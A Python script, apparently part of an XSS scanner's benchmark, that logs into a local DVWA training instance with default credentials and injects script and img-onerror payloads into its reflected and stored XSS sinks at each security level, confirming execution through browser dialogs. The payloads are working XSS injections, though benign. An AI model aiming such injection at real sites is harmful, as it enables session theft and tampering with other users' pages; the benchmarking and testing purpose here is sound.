"""Live DVWA ground-truth probe (low / medium / high), 2026-11-18.

Independent of the scanner: logs in with the real CSRF token, flips the
security level through the real cookie, injects uniquely-tokened payloads
into both reflected and stored sinks, and confirms execution with a real
Chromium dialog listener. Writes a JSON fact table plus a cookie file that
can be handed to xssentinel via `-b`.

Usage:
  python benchmark/realworld/dvwa_live_probe.py --out DIR

The session cookie is written to the system temp dir (NOT --out / the repo)
and its value is never printed: a PHPSESSID is a live credential even on a
local target, and Phase 402 found two such files sitting unignored in
benchmark/results/.
"""

import argparse
import datetime
import json
import os
import re
import tempfile
import uuid

import requests
from playwright.sync_api import sync_playwright

BASE = "http://127.0.0.1:8080"
LEVELS = ("low", "medium", "high")


def payloads(token):
    return {
        "script": "<script>window.__x='%s';alert('%s')</script>" % (token, token),
        "img": "<img src=x onerror=\"window.__x='%s';alert('%s')\">" % (token, token),
    }


def login():
    s = requests.Session()
    s.trust_env = False
    html = s.get(BASE + "/login.php", timeout=10).text
    token = re.search(r"name='user_token' value='([0-9a-f]+)'", html).group(1)
    r = s.post(
        BASE + "/login.php",
        data={
            "username": "admin",
            "password": "password",
            "Login": "Login",
            "user_token": token,
        },
        allow_redirects=True,
        timeout=10,
    )
    if r.url.endswith("login.php") or "Logout" not in r.text:
        raise RuntimeError("DVWA login failed: %s %s" % (r.status_code, r.url))
    return s


def browser_dialog(page, url, timeout=2500):
    seen = []
    page.on("dialog", lambda d: (seen.append(d.message), d.accept()))
    try:
        page.goto(url, timeout=timeout, wait_until="domcontentloaded")
        page.wait_for_timeout(700)
    except Exception:
        pass
    return seen


def main():
    global BASE
    ap = argparse.ArgumentParser()
    ap.add_argument("--out", default="benchmark/results")
    ap.add_argument("--base", default=BASE)
    args = ap.parse_args()
    BASE = args.base
    os.makedirs(args.out, exist_ok=True)

    s = login()
    sid = s.cookies.get("PHPSESSID")
    if not sid:
        raise RuntimeError("no PHPSESSID after login")

    results = []
    with sync_playwright() as pw:
        browser = pw.chromium.launch(headless=True)
        for level in LEVELS:
            # Overwrite the session's own security cookie (a per-request
            # cookie of the same name does not reliably win on requests).
            s.cookies.set("security", level, domain="127.0.0.1", path="/")
            ctx = browser.new_context()
            ctx.add_cookies([
                {"name": "security", "value": level, "url": BASE},
                {"name": "PHPSESSID", "value": sid, "url": BASE},
            ])
            check = s.get(BASE + "/security.php", timeout=10)
            marker = "Security level is currently: <em>%s</em>" % level
            if marker not in check.text:
                raise RuntimeError("level switch unverified for %s" % level)

            for carrier, payload in payloads("t" + uuid.uuid4().hex[:8]).items():
                token = re.search(r"alert\('([^']+)'\)", payload).group(1)
                # --- reflected: xss_r / name GET ---
                ref_url = BASE + "/vulnerabilities/xss_r/?name=" + requests.utils.quote(payload)
                ref_resp = s.get(ref_url, timeout=10)
                ref_raw = payload in ref_resp.text
                page = ctx.new_page()
                ref_dialogs = browser_dialog(page, ref_url)
                page.close()
                results.append({
                    "level": level,
                    "carrier": carrier,
                    "token": token,
                    "surface": "reflected:name",
                    "http_has_raw_payload": ref_raw,
                    "dialog_confirmed": bool(ref_dialogs),
                    "dialogs": ref_dialogs,
                })

                # --- stored: xss_s / mtxMessage and txtName POST ---
                for field in ("mtxMessage", "txtName"):
                    data = {"txtName": "probe", "mtxMessage": "probe",
                            "btnSign": "Sign Guestbook"}
                    data[field] = payload
                    # Clear first: otherwise earlier payloads accumulate in
                    # the guestbook and make every later case look positive.
                    s.post(BASE + "/vulnerabilities/xss_s/",
                           data={"btnClear": "Clear Guestbook"}, timeout=10)
                    s.post(BASE + "/vulnerabilities/xss_s/",
                           data=data, timeout=10)
                    view = s.get(BASE + "/vulnerabilities/xss_s/", timeout=10)
                    stored_raw = payload in view.text
                    page = ctx.new_page()
                    stored_dialogs = browser_dialog(
                        page, BASE + "/vulnerabilities/xss_s/")
                    page.close()
                    results.append({
                        "level": level,
                        "carrier": carrier,
                        "token": token,
                        "surface": "stored:%s" % field,
                        "http_has_raw_payload": stored_raw,
                        "dialog_confirmed": bool(stored_dialogs),
                        "dialogs": stored_dialogs,
                    })
            ctx.close()
        browser.close()

    stamp = datetime.date.today().strftime("%Y%m%d")
    out_json = os.path.join(args.out, "dvwa_live_groundtruth_%s.json" % stamp)
    with open(out_json, "w", encoding="utf-8") as fh:
        json.dump(results, fh, ensure_ascii=False, indent=2)
    # Phase 402: live session cookie -> system temp, never the repo, and
    # never echoed to stdout (where it lands in shell history / CI logs).
    cookie_file = os.path.join(
        tempfile.gettempdir(), "dvwa_live_cookie_%s.txt" % stamp)
    with open(cookie_file, "w", encoding="utf-8") as fh:
        fh.write("PHPSESSID=%s" % sid)
    os.chmod(cookie_file, 0o600)
    print("facts:", out_json)
    print("cookie (local only, value withheld):", cookie_file)
    for r in results:
        print("%-6s %-8s %-20s raw=%-5s dialog=%s" % (
            r["level"], r["carrier"], r["surface"],
            r["http_has_raw_payload"], r["dialog_confirmed"]))


if __name__ == "__main__":
    main()
